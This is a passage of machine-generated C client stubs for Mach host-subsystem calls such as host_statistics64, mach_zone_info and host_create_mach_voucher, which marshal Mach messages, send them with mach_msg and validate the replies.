	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 217;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(217, "host_request_notification")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(217, "host_request_notification")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_request_notification_t__defined)
	check_result = __MIG_check__Reply__host_request_notification_t((__Reply__host_request_notification_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_request_notification_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_lockgroup_info_t__defined)
#define __MIG_check__Reply__host_lockgroup_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_lockgroup_info_t(__Reply__host_lockgroup_info_t *Out0P)
{

	typedef __Reply__host_lockgroup_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 318) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->lockgroup_info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->lockgroup_info.size / 264 != Out0P->lockgroup_infoCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_lockgroup_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_lockgroup_info */
mig_external kern_return_t host_lockgroup_info
(
	host_t host,
	lockgroup_info_array_t *lockgroup_info,
	mach_msg_type_number_t *lockgroup_infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t lockgroup_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t lockgroup_infoCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t lockgroup_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t lockgroup_infoCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_lockgroup_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_lockgroup_info_t__defined */

	__DeclareSendRpc(218, "host_lockgroup_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 218;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(218, "host_lockgroup_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(218, "host_lockgroup_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_lockgroup_info_t__defined)
	check_result = __MIG_check__Reply__host_lockgroup_info_t((__Reply__host_lockgroup_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_lockgroup_info_t__defined) */

	*lockgroup_info = (lockgroup_info_array_t)(Out0P->lockgroup_info.address);
	*lockgroup_infoCnt = Out0P->lockgroup_infoCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_statistics64_t__defined)
#define __MIG_check__Reply__host_statistics64_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_statistics64_t(__Reply__host_statistics64_t *Out0P)
{

	typedef __Reply__host_statistics64_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 319) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 1024)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->host_info64_outCnt > 256 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 1024)) / 4< Out0P->host_info64_outCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 1024) + Out0P->host_info64_outCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_statistics64_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_statistics64 */
mig_external kern_return_t host_statistics64
(
	host_t host_priv,
	host_flavor_t flavor,
	host_info64_t host_info64_out,
	mach_msg_type_number_t *host_info64_outCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		host_flavor_t flavor;
		mach_msg_type_number_t host_info64_outCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info64_outCnt;
		integer_t host_info64_out[256];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info64_outCnt;
		integer_t host_info64_out[256];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_statistics64_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_statistics64_t__defined */

	__DeclareSendRpc(219, "host_statistics64")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*host_info64_outCnt < 256)
		InP->host_info64_outCnt = *host_info64_outCnt;
	else
		InP->host_info64_outCnt = 256;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host_priv;
	InP->Head.msgh_id = 219;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(219, "host_statistics64")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(219, "host_statistics64")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_statistics64_t__defined)
	check_result = __MIG_check__Reply__host_statistics64_t((__Reply__host_statistics64_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_statistics64_t__defined) */

	if (Out0P->host_info64_outCnt > *host_info64_outCnt) {
		(void)memcpy((char *) host_info64_out, (const char *) Out0P->host_info64_out, 4 *  *host_info64_outCnt);
		*host_info64_outCnt = Out0P->host_info64_outCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) host_info64_out, (const char *) Out0P->host_info64_out, 4 * Out0P->host_info64_outCnt);

	*host_info64_outCnt = Out0P->host_info64_outCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__mach_zone_info_t__defined)
#define __MIG_check__Reply__mach_zone_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_zone_info_t(__Reply__mach_zone_info_t *Out0P)
{

	typedef __Reply__mach_zone_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 320) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 2 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->names.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->names.size / 80 != Out0P->namesCnt)
		return MIG_TYPE_ERROR;
	if (Out0P->info.size / 64 != Out0P->infoCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__mach_zone_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_zone_info */
mig_external kern_return_t mach_zone_info
(
	host_priv_t host,
	mach_zone_name_array_t *names,
	mach_msg_type_number_t *namesCnt,
	mach_zone_info_array_t *info,
	mach_msg_type_number_t *infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_zone_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_zone_info_t__defined */

	__DeclareSendRpc(220, "mach_zone_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 220;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(220, "mach_zone_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(220, "mach_zone_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_zone_info_t__defined)
	check_result = __MIG_check__Reply__mach_zone_info_t((__Reply__mach_zone_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_zone_info_t__defined) */

	*names = (mach_zone_name_array_t)(Out0P->names.address);
	*namesCnt = Out0P->namesCnt;

	*info = (mach_zone_info_array_t)(Out0P->info.address);
	*infoCnt = Out0P->infoCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_create_mach_voucher_t__defined)
#define __MIG_check__Reply__host_create_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_create_mach_voucher_t(__Reply__host_create_mach_voucher_t *Out0P)
{

	typedef __Reply__host_create_mach_voucher_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 322) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->voucher.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->voucher.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_create_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_create_mach_voucher */
mig_external kern_return_t host_create_mach_voucher
(
	host_t host,
	mach_voucher_attr_raw_recipe_array_t recipes,
	mach_msg_type_number_t recipesCnt,
	ipc_voucher_t *voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t recipesCnt;
		uint8_t recipes[5120];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__host_create_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_create_mach_voucher_t__defined */

	__DeclareSendRpc(222, "host_create_mach_voucher")

	InP->NDR = NDR_record;

	if (recipesCnt > 5120) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->recipes, (const char *) recipes, recipesCnt);

	InP->recipesCnt = recipesCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 5120) + (_WALIGN_(recipesCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 222;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(222, "host_create_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(222, "host_create_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_create_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__host_create_mach_voucher_t((__Reply__host_create_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_create_mach_voucher_t__defined) */

	*voucher = Out0P->voucher.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined)
#define __MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_register_mach_voucher_attr_manager_t(__Reply__host_register_mach_voucher_attr_manager_t *Out0P)
{

	typedef __Reply__host_register_mach_voucher_attr_manager_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 323) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->new_attr_control.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->new_attr_control.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_register_mach_voucher_attr_manager */
mig_external kern_return_t host_register_mach_voucher_attr_manager
(
	host_t host,
	mach_voucher_attr_manager_t attr_manager,
	mach_voucher_attr_value_handle_t default_value,
	mach_voucher_attr_key_t *new_key,
	ipc_voucher_attr_control_t *new_attr_control
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t attr_manager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_value_handle_t default_value;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_attr_control;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_key_t new_key;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_attr_control;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_key_t new_key;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined */

	__DeclareSendRpc(223, "host_register_mach_voucher_attr_manager")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t attr_managerTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->attr_manager = attr_managerTemplate;
	InP->attr_manager.name = attr_manager;
#else	/* UseStaticTemplates */
	InP->attr_manager.name = attr_manager;
	InP->attr_manager.disposition = 19;
	InP->attr_manager.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->default_value = default_value;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 223;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(223, "host_register_mach_voucher_attr_manager")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(223, "host_register_mach_voucher_attr_manager")
	if (msg_result != MACH_MSG_SUCCESS) {
